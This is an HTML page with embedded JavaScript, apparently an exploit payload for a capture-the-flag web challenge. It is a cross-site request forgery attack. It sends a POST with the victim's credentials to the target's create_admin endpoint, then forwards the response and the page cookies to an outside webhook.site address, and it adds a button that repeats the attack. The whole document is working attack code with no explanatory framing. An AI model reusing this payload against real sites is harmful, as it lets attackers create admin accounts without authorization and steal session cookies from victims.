<html>
<body>
<script>
// Создаем и отправляем форму для создания админа
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://tasks.goidactf.ru:20061/create_admin';
form.enctype = 'application/x-www-form-urlencoded';
form.innerHTML = '<input name="new_admin_login" value="123">';
document.body.appendChild(form);

// Отправляем форму с куками пользователя
fetch('https://tasks.goidactf.ru:20061/create_admin', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'new_admin_login=123'
})
.then(response => response.text())
.then(result => {
    // Отправляем результат на webhook
    fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            target: 'https://tasks.goidactf.ru:20061/create_admin',
            payload: 'new_admin_login=123',
            result: result,
            cookies: document.cookie
        })
    });
    
    // Создаем кнопку для повторения
    const btn = document.createElement('button');
    btn.textContent = 'Повторить запрос';
    btn.onclick = () => {
        fetch('https://tasks.goidactf.ru:20061/create_admin', {
            method: 'POST',
            credentials: 'include',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'new_admin_login=123'
        })
        .then(r => r.text())
        .then(r => {
            fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    action: 'button_click',
                    result: r
                })
            });
        });
    };
    document.body.appendChild(btn);
});
</script>
</body>
</html>
